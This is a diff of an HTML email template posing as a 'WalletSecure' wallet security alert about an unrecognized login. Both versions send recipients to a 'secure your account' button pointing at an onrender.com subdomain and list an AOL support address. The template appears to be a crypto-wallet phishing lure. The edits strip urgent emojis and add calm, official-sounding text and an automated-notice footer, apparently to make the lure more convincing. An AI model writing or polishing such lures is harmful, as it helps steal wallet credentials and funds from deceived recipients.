@@ -164,39 +164,41 @@
     <div class="container">
         <div class="header">
             <span class="alert-icon">🔒</span>
-            <h1>Security Alert - Unrecognized Login Attempt</h1>
-            <p>Immediate action may be required</p>
+            <h1>Account Security Alert</h1>
+            <p>New device access detected on your account</p>
         </div>
         
         <div class="content">
             <p>Hello {{recipient_name}},</p>
             
             <div class="urgent-notice">
-                🚨 We detected a new login attempt to your wallet from an unrecognized device
+                Access attempt detected from unrecognized device
             </div>
             
             <div class="alert-box">
-                <h3 style="margin-top: 10px;">Security Event Detected</h3>
-                <p>Our security systems have identified a login attempt from a device that hasn't been used with your account before. If this wasn't you, your account may be at risk.</p>
+                <h3 style="margin-top: 10px;">Account Access Notification</h3>
+                <p>We have detected a sign-in attempt to your account from a device or location that we don't recognize. This could be you accessing your account from a new device, or it could indicate unauthorized access.</p>
+                
+                <p>If this was you, you can safely ignore this message. If you don't recognize this activity, we recommend securing your account immediately.</p>
             </div>
             
             <div class="device-info">
-                <h3>🖥️ Device Information</h3>
+                <h3>Access Details</h3>
                 <div class="info-grid">
+                    <div class="info-label">Date & Time:</div>
+                    <div class="info-value">{{login_time}}</div>
+                    
                     <div class="info-label">Location:</div>
                     <div class="info-value">{{login_location}}</div>
                     
                     <div class="info-label">IP Address:</div>
                     <div class="info-value">{{ip_address}}</div>
                     
-                    <div class="info-label">Device:</div>
+                    <div class="info-label">Device Type:</div>
                     <div class="info-value">{{device_info}}</div>
                     
                     <div class="info-label">Browser:</div>
                     <div class="info-value">{{browser_info}}</div>
-                    
-                    <div class="info-label">Time:</div>
-                    <div class="info-value">{{login_time}}</div>
                 </div>
             </div>
             
@@ -205,26 +207,31 @@
             </div>
             
             <div class="action-buttons">
-                <a href="https://walletsecure.onrender.com" class="btn btn-danger">🔒 Secure My Account</a>
-                <a href="#" class="btn btn-outline">✅ This Was Me</a>
+                <a href="https://walletsecure.onrender.com" class="btn btn-danger">Review Account Security</a>
+                <a href="#" class="btn btn-outline">I Recognize This Activity</a>
             </div>
             
             <div class="security-tips">
-                <h3>🔐 Account Security Notice</h3>
-                <p>We take your account security seriously. If you recognize this login attempt, no further action is required. If you don't recognize this activity, please secure your account immediately using the button above.</p>
-                <p>Our security team continuously monitors for suspicious activities to protect your digital assets.</p>
+                <h3>What should I do?</h3>
+                <p><strong>If you recognize this activity:</strong> No action is required. You can safely disregard this notification.</p>
+                <p><strong>If you don't recognize this activity:</strong> Please review your account security settings immediately. Consider changing your password and enabling additional security measures.</p>
+                <p>We monitor all account access to help protect your digital assets and maintain the highest level of security.</p>
             </div>
             
-            <p>Stay secure,<br>
-            <strong>The WalletSecure Security Team</strong></p>
+            <p>Thank you for helping us keep your account secure.</p>
+            
+            <p>Regards,<br>
+            <strong>Account Security Team</strong><br>
+            WalletSecure</p>
         </div>
         
         <div class="footer">
-            <p>This security alert was sent to {{recipient_email}} because suspicious activity was detected on your wallet account.</p>
-            <p>If you no longer wish to receive security alerts, <a href="mailto:unsubscribe@walletsecure.com?subject=Unsubscribe%20Security%20Alerts">click here</a> (not recommended for security).</p>
-            <p>WalletSecure | Secure Digital Solutions<br>
-            Contact us: walletsecure.detect@aol.com | 24/7 Security Hotline</p>
-            <p>© 2025 WalletSecure. All rights reserved. | Alert ID: WS-{{alert_id}}</p>
+            <p>This notification was automatically generated and sent to {{recipient_email}} based on account access monitoring.</p>
+            <p>WalletSecure employs advanced security monitoring to detect unusual account activity and protect our users.</p>
+            <p><strong>WalletSecure</strong> | Secure Digital Solutions<br>
+            Support: walletsecure.detect@aol.com | Security Operations Center</p>
+            <p>© 2025 WalletSecure. All rights reserved. | Reference: {{alert_id}}</p>
+            <p style="font-size: 12px; color: #999;">This is an automated security notification. Please do not reply to this email.</p>
         </div>
     </div>
 </body>
